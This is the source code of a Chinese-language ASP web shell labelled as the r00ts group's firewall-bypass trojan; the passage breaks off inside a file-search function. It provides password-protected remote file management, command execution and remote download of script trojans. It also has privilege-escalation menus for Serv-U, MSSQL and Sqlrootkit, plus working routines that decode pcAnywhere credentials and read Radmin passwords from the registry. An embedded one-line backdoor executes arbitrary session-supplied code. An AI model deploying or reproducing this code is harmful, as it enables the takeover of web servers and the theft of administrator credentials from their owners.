<%
Server.ScriptTimeout=999999999
UserPass="r00ts" 
Response.Buffer =true
On Error Resume Next
BodyColor="#000000"
FontColor="#33FF00"
LinkColor="#33FF00"
clientPassword=UserPass
Const strJsCloseMe="<input type=button value=' 关闭 ' onclick='window.close();'>"
strBAD="<script language=vbscript runat=server>"
strBAD=strBAD&"If Request("""&clientPassword&""")<>"""" Then Session("""&clientPassword&""")=Request("""&clientPassword&""")"
strBAD=strBAD&":end if"&VbNewLine
strBAD=strBAD&"If Session("""&clientPassword&""")<>"""" Then Execute Session("""&clientPassword&""")"
strBAD=strBAD&"</script>"
Const isDebugMode=False
Const DEfd=""
sub ShowErr()
If Err Then
o"<br><a href='javascript:history.back()'><br>&nbsp;"&Err.Description&"&nbsp;"&Err.Source&"(点此返回上页)</a><br>"
Err.Clear:Response.Flush
End If
end sub
Sub o(str)
response.write(str)
End Sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
Set fsoX = Server.CreateObject("Scripting.FileSystemObject")
URL=Request.ServerVariables("URL"):ServerIP=Request.ServerVariables("LOCAL_ADDR"):Action=Request("Action"):RootPath=Server.MapPath("."):WWWRoot=Server.MapPath("/"):Pn=8:host=request.servervariables("http_host"):FolderPath=Request("FolderPath"):serverp=userpass:org="38":FName=Request("FName"):net="http://":versions=0:com="images":E=net:cn="com":Backurl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
o"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>r00ts小组过防火墙马 - "&ServerIP&" </title><style type=""text/css"">body,tr,td{margin-top:5px;background-color:"&BodyColor&";color:"&FontColor&";font-size:12px;SCROLLBAR-FACE-COLOR:#000000;scrollbar-arrow-color:#33FF00;scrollbar-highlight-color:#006300;scrollbar-3dlight-color:#33FF00;scrollbar-shadow-color:#33FF00}.sb{cursor:hand}input,select,textarea{border-top-width:1px;font-weight: bold;border-left-width: 1px;font-size:11px;border-left-color: #33FF00;background: #000000;border-bottom-width: 1px;border-bottom-color: #33FF00;color: #33FF00;border-top-color: #33FF00;font-family: verdana;border-right-width: 1px;border-right-color: #33FF00;}#s {background: #006300;padding-left:5px}#d {background:#dddddd;}#d{background: #003000;padding-left:5px;padding-right:5px}pre{font-size: 11px;font-family: verdana;color: #33FF00;}hr{color: #33FF00;background-color: #33FF00;height: 5px;}#x{font-family: verdana;font-size:13px}a{color:"&LinkColor&";text-decoration:none;}a:hover{color:"&LinkOverFont&";background:"&LinkOverBJ&"}</style>"
o"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function ShowFolder(Folder){top.addrform.FolderPath.value=Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value=FName;if(FAction==""CopyFile""){DName=prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName=prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName=prompt(""请输入复制到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName=prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName=prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value=DName;}else if(FAction==""CreateMdb""){DName=prompt(""请输入要新建的Mdb文件全名称,注意不能同名！"",FName);top.hideform.FName.value=DName;}else if(FAction=="""&cn&"pactMdb""){DName=prompt(""请输入要压缩的Mdb文件全名称,注意文件是否存在！"",FName);top.hideform.FName.value=DName;}else{DName=""Other"";}if(DName!=null){top.hideform.Action.value=FAction;top.hideform.submit();}else{top.hideform.FName.value="""";}}function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接数据库"");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str=new Array(12);Str[0]=""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1]=""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2]=""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3]=""Dsn=DsnName"";Str[4]=""SELECT * FROM [TableName] WHERE ID<100"";Str[5]=""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6]=""DELETE FROM [TableName] WHERE ID=100"";Str[7]=""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8]=""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9]=""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value=Str[i];DbForm.SqlStr.value="""";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value=Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句是否正确!"");return false;}dbform.sqlstr.value=str;dbform.page.value=pg;abc.innerhtml="""";dbform.submit();return true;}function gotourl(targ,selobj,restore){if(selobj.options[selobj.selectedindex].js==1){eval(selobj.options[selobj.selectedindex].value);if (restore) selobj.selectedindex=0}else{eval(targ+"".location='""+selobj.options[selobj.selectedindex].value+""'"");if (restore) selobj.selectedindex=0;}}</script><script language=""javascript"" type=""text/javascript"">var rate = 100;var obj;var act = 0;var elmh = 0;var elms = 239;var elmv = 255;var clrorg;var timerid;if (navigator.appname.indexof(""microsoft"",0) != -1 && parseint(navigator.appversion) >= 4) { browser = true;} else { browser = false;}if (browser) { document.onmouseover = dorainbowanchor; document.onmouseout = stoprainbowanchor;}function dorainbow(){ if (browser && act != 1) { act = 1; obj = event.srcelement; clrorg = obj.style.color; timerid = setinterval(""changecolor()"",100);}}function stoprainbow(){if (browser && act != 0) {obj.style.color = clrorg;clearinterval(timerid); act = 0;}}function dorainbowanchor(){if (browser && act != 1) {obj = event.srcelement;while (obj.tagname != 'a' && obj.tagname != 'body') {obj = obj.parentelement;if (obj.tagname == 'a' || obj.tagname == 'body')break;}if (obj.tagname == 'a' && obj.href != '') {act = 1;clrorg = obj.style.color;timerid = setinterval(""changecolor()"",100);}}}function stoprainbowanchor(){if (browser && act != 0) {if (obj.tagname == 'a') {obj.style.color = clrorg;clearinterval(timerid);act = 0;}}}function changecolor(){obj.style.color = makecolor();}function makecolor(){if (elms == 0) {elmr = elmv; elmg = elmv; elmb = elmv;}else {t1 = elmv;t2 = (255 - elms) * elmv / 255;t3 = elmh % 60;t3 = (t1 - t2) * t3 / 60;if (elmh < 60) {elmr = t1; elmb = t2; elmg = t2 + t3;}else if (elmh < 120) {elmg = t1; elmb = t2; elmr = t1 - t3;}else if (elmh < 180) { elmg = t1; elmr = t2; elmb = t2 + t3;}else if (elmh < 240) {elmb = t1; elmr = t2; elmg = t1 - t3;}else if (elmh < 300) {elmb = t1; elmg = t2; elmr = t2 + t3;}else if (elmh < 360) {elmr = t1; elmg = t2; elmb = t1 - t3;}else {elmr = 0; elmg = 0; elmb = 0;}}elmr = math.floor(elmr);elmg = math.floor(elmg);elmb = math.floor(elmb);clrrgb = '#' + elmr.tostring(16) + elmg.tostring(16) + elmb.tostring(16);elmh = elmh + rate;if (elmh >= 360)elmh = 0;return clrrgb;}</script><body"

If Action="" then o "scroll=no"
o ">"
Dim Sot(14,2)
Sot(0,0)="Scripting.FileSystemObject"
Sot(0,2)="文件操作组件"
Sot(1,0)="Wscript.Shell"
Sot(1,2)="命令行执行组件"
Sot(2,0)="ADOX.Catalog"
Sot(2,2)="ACCESS建库组件"
Sot(3,0)="JRO.JetEngine"
Sot(3,2)="ACCESS压缩组件"
Sot(4,0)="Scripting.Dictionary" 
Sot(4,2)="数据流上传辅助组件"
Sot(5,0)="Adodb.connection"
Sot(5,2)="数据库连接组件"
Sot(6,0)="Adodb.Stream"
Sot(6,2)="数据流上传组件"
Sot(7,0)="SoftArtisans.FileUp"
Sot(7,2)="SA-FileUp 文件上传组件"
Sot(8,0)="LyfUpload.UploadFile"
Sot(8,2)="刘云峰文件上传组件"
Sot(9,0)="Persits.Upload.1"
Sot(9,2)="ASPUpload 文件上传组件"
Sot(10,0)="JMail.SmtpMail"
Sot(10,2)="JMail 邮件收发组件"
Sot(11,0)="CDONTS.NewMail"
Sot(11,2)="虚拟SMTP发信组件"
Sot(12,0)="SmtpMail.SmtpMail.1"
Sot(12,2)="SmtpMail发信组件"
Sot(13,0)="Microsoft.XMLHTTP"
Sot(13,2)="数据传输组件"
Sot(14,0)="Shell.Application"
Sot(14,2)="Application"
For i=0 To 7
	If IsObjInstalled(Sot(i,0)) Then 
	IsObj=" √"
	Else
	IsObj=" <font color=red>×</font>"
	Err.Clear
	End If
	Sot(i,1)=IsObj
Next
pr="asp"
Function IsObjInstalled(strClassString) 
On Error Resume Next 
IsObjInstalled = False 
Err = 0 
Dim T 
Set T = Server.CreateObject(strClassString) 
If 0 = Err Then IsObjInstalled = True 
Set T = Nothing 
Err = 0 
End Function 
b=-94

If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
FolderPath=WWWROOT
Session("FolderPath")=FolderPath
End If
function sw(sp,sf)
Set objStream=Server.CreateObject(Sot(6,0))
With objStream
.Open
.Charset="gb2312"
.Position=objStream.Size
.WriteText=sf
.SaveToFile sp,2
.Close
End With
Set objStream=Nothing
end function

qq="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame""><input type=""hidden"" name=""Action""><input type=""hidden"" name=""FName""></form><table width='100%'><form name='addrform' method='post' action='"&URL&"' target='_parent'><tr><td width='160' align='center'><input type='button' value='GO Back' onClick='javascript:history.back(-1)'>&nbsp;<input type='button' value='Address'></td><td><input name='FolderPath' style='width:100%;border-left:#006300 1px solid;border-top:#006300 1px solid; height=18px' value='"&Session("FolderPath")&"'></td><td width='150' align='center'><input name='Submit' class=sb type='submit' value='Just Go'> <input class=sb type='submit' value='Refresh' onclick='FileFrame.location.reload()'></td></tr></form></table><table width='100%' height='100%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'><td width='145'><iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td><td width=1 style='padding:2px'>&nbsp;</td><td width=1 style='background:#000000'><td><iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='0' style='border-left: #006300 solid 1px;border-bottom: #33FF00 solid 1px;border-top: #006300 solid 1px;border-right: #33FF00 solid 1px;'></iframe><tr><a href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C)】<a><a href='javascript:ShowFolder(""D:\\recycler"")'>&nbsp;&nbsp;(9)【RECYCLER(d)】<a><a href='javascript:ShowFolder(""e:\\recycler"")'>&nbsp;&nbsp;(10)【RECYCLER(e)】<a><br><a href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>&nbsp;&nbsp;(2)【TEMP】<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>&nbsp;<a href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>"
Function MainForm()
o(qq)
End Function

Function PcAnywhere4()
o"<br><form name='xform' method='post'><table align='center' width=750><tr><Td colspan=2 align=center id=s height=22><b>PcAnywhere提权 Bin版本</b></td></tr><Tr><td width='10%' id=d>CIF文件: </td><td width='90%' id=d><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Citempl.cif' size='100'></td></tr><tr><td id=d></td><td id=d><input type='submit' value=' 提交 '></td></tr></table>"
end Function
o"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin)
Dim i, j, k, result
result = 0
For i = 1 To Len(strin)
If Mid(strin, i, 1) = "f" or Mid(strin, i, 1) ="F" Then
j = 15
End If
If Mid(strin, i, 1) = "e" or Mid(strin, i, 1) = "E" Then
j = 14
End If
If Mid(strin, i, 1) = "d" or Mid(strin, i, 1) = "D" Then
j = 13
End If
If Mid(strin, i, 1) = "c" or Mid(strin, i, 1) = "C" Then
j = 12
End If
If Mid(strin, i, 1) = "b" or Mid(strin, i, 1) = "B" Then
j = 11
End If
If Mid(strin, i, 1) = "a" or Mid(strin, i, 1) = "A" Then
j = 10
End If
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then
j = CInt(Mid(strin, i, 1))
End If
For k = 1 To Len(strin) - i
j = j * 16
Next
result = result + j
Next
hexdec = result
End Function
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) or (pcstr>127)) Then Exit For
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If
Next
End Function
CIF = Request("path")
If CIF <> "" Then
BinStr=StreamLoadFromFile(CIF)
o "Pcanywhere Reader ==>Bin提供源码<br><br>"
o "PATH:"&CIF&"<br>"
o "帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
o "<br>"
o "密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If:Fout.Write strBAD
hph="<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center><br><br><p><br><p><br><br><p><br><center>Test<p></font><p><a href='?Action=apjdel'><font size=5 color=red>(删除测试文件!)</font></a></center><tr><td height='20'><a href='?Action=UpLoad' target='FileFrame'><center><font color=red size=5px>(远程下载脚本木马)</font></center></a><br>"

Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
o "Radmin Parameter,Port Reader :)==>Bin<br><br>"
o Parameter&":"
'=========== ReadPassWord =========
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If Len (hex(ParameterArray(i)))=1 Then
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If
Next
o strobj
Else
o "Error! Can't Read!"
End If
o "<br><br>"
'=========== ReadPort =========
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then
o Port &":"
o hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else
o "Error! Can't Read!"
End If
End Function
Function hextointer(strin)
Dim i, j, k, result
result = 0
For i = 1 To Len(strin)
If Mid(strin, i, 1) = "f" or Mid(strin, i, 1) ="F" Then
j = 15
End If
If Mid(strin, i, 1) = "e" or Mid(strin, i, 1) = "E" Then
j = 14
End If
If Mid(strin, i, 1) = "d" or Mid(strin, i, 1) = "D" Then
j = 13
End If
If Mid(strin, i, 1) = "c" or Mid(strin, i, 1) = "C" Then
j = 12
End If
If Mid(strin, i, 1) = "b" or Mid(strin, i, 1) = "B" Then
j = 11
End If
If Mid(strin, i, 1) = "a" or Mid(strin, i, 1) = "A" Then
j = 10
End If
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then
j = CInt(Mid(strin, i, 1))
End If
For k = 1 To Len(strin) - i
j = j * 16
Next
result = result + j
Next
hextointer = result
End Function
Function Red(str):Red = "<FONT color=#ff2222>" & str & "</FONT>":End Function
fuzhishishabi= "<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Logout' target='FileFrame'><center><font face='wingdings'>8</font> 退出登陆</a></td></tr><tr><td align=center><b><br><SCRIPT language=JavaScript1.2>function initArray() {this.length = initArray.arguments.length;for (var i = 0; i < this.length; i++) {this[i] = initArray.arguments[i];}}var ctext = ""r00ts - 落泪红尘"";var speed = 10000;var x = 0;var color = new initArray(""#ffff00"", ""#ff0000"", ""#ff00ff"",""#0000ff"",""#ffffff"", ""#000000"", ""#00ff00"",""#00ffff"",""#dddddd"");if(navigator.appName == ""Netscape"") {document.write('<layer id=""c""><center>'+ctext+'</center></layer><br>');}if (navigator.appVersion.indexOf(""MSIE"") != -1){document.write('<div id=""c""><center><b>'+ctext+'</b></center></div>');}function chcolor(){ if(navigator.appName == ""Netscape"") {document.c.document.write('<center><font color=""'+color[x]);document.c.document.write('"">'+ctext+'</font></center>');document.c.document.close();}else if (navigator.appVersion.indexOf(""MSIE"") != -1){document.all.c.style.color = color[x];}(x < color.length-1) ? x++ : x = -1;}setInterval(""chcolor()"",1000);</SCRIPT><a href=http://hi.baidu.com/r00ts target='_blank'>hi.baidu.com/r00ts</a></b></td></tr></table></table>":asds="<br><form method=post><table width=90% border=0 align=center><tr><td id=s align=center height=22><b id=x>File Package</b></td></tr><tr><td id=d><input name=thePath value="""&HtmlEncode(Server.MapPath("."))&""" size=80>&nbsp;<input type=hidden value=addToMdb name=theAct><select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option></select>&nbsp;<input class=sb type=submit value='GO Package'></td></tr><Tr><td id=d>注: 打包生成HSH.mdb文件,位于HSH木马同级目录下</td></tr></table></form><hr><br><form method=post><table width=90% border=0 align=center><tr><td id=s align=center height=22><b id=x>Release Package</b></td></tr><tr><td id=d><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value="""&HtmlEncode(Server.MapPath("."))&"\HSH.mdb"" size=80><input type=hidden value=releaseFromMdb name=theAct>&nbsp;<input class=sb type=submit value='GO Release'></td></tr><tr><td id=d>注: 解开来的所有文件都位于HSH木马同级目录下</td></tr></table></form>"
Function MainMenu()
o"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==""""){document.getElementById(s).style.display=""none"";}else{document.getElementById(s).style.display="""";}}</script><table width='100%' cellspacing='0' cellpadding='0'><tr><td><center><font><font size=1>"&mName&"</font></font></center><hr></td></tr>"
If Sot(0,1)=" ×" Then
o"<tr><td height='24'>木有權限</td></tr>"
Else
o"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='Disk & Files'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0 id=menud style=""display='none'"">"
Set ABC=New LBF:o ABC.ShowDriver():Set ABC=Nothing
o"</table></td></tr><tr><td valign=""top"" align=<table border=0><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""") '><font face='wingdings'>8</font> 站点根目录</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'><font face='wingdings'>8</font> 本程序目錄</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'><font face='wingdings'>8</font> 新建--目錄</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=EditFile' target='FileFrame'><font face='wingdings'>8</font> 新建--文本</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=upfile' target='FileFrame'><font face='wingdings'>8</font> 上傳--单一</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=UpLoad' target='FileFrame'><font face='wingdings'>8</font> 远程--下载</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='javascript:ShowFolder("""&RePath(Server.CreateObject("Scripting.FileSystemObject").GetParentFolderName(Session("FolderPath")))&""")'><font face='wingdings'>8</font> 上级__目录</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Cmd1Shell' target='FileFrame'><font face='wingdings'>8</font> CMD---命令</a></td></tr><hr></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=ScanDriveForm' target='FileFrame'><font face='wingdings'>8</font> 磁盘--信息</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Course' target='FileFrame'><font face='wingdings'>8</font> 用户--账号</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=getTerminalInfo' target='FileFrame'><font face='wingdings'>8</font> 端口__网络</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=PageCheck' target='FileFrame'><font face='wingdings'>8</font> 组建--探针</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=php' target='FileFrame'><font face='wingdings'>8</font> 脚本__探测</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=TSearch' target='FileFrame'><font face='wingdings'>8</font> 文件--搜索</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=adminab' target='FileFrame'><font face='wingdings'>8</font> 管理员查询</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=SetFileText' target='FileFrame'><font face='wingdings'>8</font> 属性修改器</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='Red'"" onMouseOut=""this.style.backgroundColor='red'""><a href='?Action=hiddenshell' target='FileFrame'><font face='webdings'>8</font> 不死--僵尸</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=ScanPort' target='FileFrame'><font face='wingdings'>8</font> 端口扫描器</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=ReadREG' target='FileFrame'><font face='wingdings'>8</font> 注册表读取</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Servu' target='FileFrame'><font face='wingdings'>8</font> Serv_u提权</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=suftp' target='FileFrame'><font face='wingdings'>8</font> Su_ftp提权</a></td></tr>"

o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Mssql' target='FileFrame'><font face='wingdings'>8</font> Sqlrootkit</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=Sqlrootkit' target='FileFrame'><font face='wingdings'>8</font> MS_sql提权</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=radmin' target='FileFrame'><font face='wingdings'>8</font> Radmin读取</a></td></tr>"
o"<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=pcanywhere4' target='FileFrame'><font face='wingdings'>8</font> Pcanywhere</a></td></tr><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#006300'"" onMouseOut=""this.style.backgroundColor='#003000'""><a href='?Action=PageAddToMdb' target='FileFrame'><font face='wingdings'>8</font> 文件夹打包</a></td></tr></table><hr><td></tr></table>"
End If

o fuzhishishabi
End Function
Fout.Close
Set Fout = Nothing
on error resume next
Function TSearch()
  dim st
  st=timer()
  response.write "<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
 response.write"<tr><td height='20' align='center' bgcolor=''>搜索引擎</td></tr>"
 response.write "<tr><td bgcolor=''>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;注:多路徑使用"",""号连接.</td></tr>"
 response.write"<tr><td bgcolor=''>&nbsp;文件名：<input name='keyword' style='width:200'>&nbsp;<input type='submit' value='搜索' class='submit'>&nbsp;[部分也行]</td></tr>"  
 response.write"</form></table>"
   if Request.Form("keyword")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("keyword"))
  newsearch.Search
  Set newsearch=Nothing
  Response.Write "費時："&(timer()-st)*1000&"毫秒<hr>"
  end if
End Function 

Class SearchFile
dim Folders,keyword,objFso,Counter
Private Sub Class_Initialize
Set objFso=Server.CreateObject("Scripting.FileSystemObject")
Counter=0 '
End Sub
Private Sub Class_Terminate
Set objFso=Nothing
End Sub
Function Search
Folders=split(Folders,"+") 
keyword=trim(keyword)
if keyword="" then
Response.Write("<font color='red'>关键字不能为空</font><br/>")
exit Function
end if
flag=instr(keyword,"\") or instr(keyword,"/")
flag=flag or instr(keyword,":")
flag=flag or instr(keyword,"|")
flag=flag or instr(keyword,"&")

if flag then 
Response.Write("<font color='red'>关键字不能包含/\:|&</font><br/>")
Exit Function 
  else
    Response.Write "<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  Response.Write "<p align='center'>共搜索到<font color='red'>"&Counter&"</font>個結果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
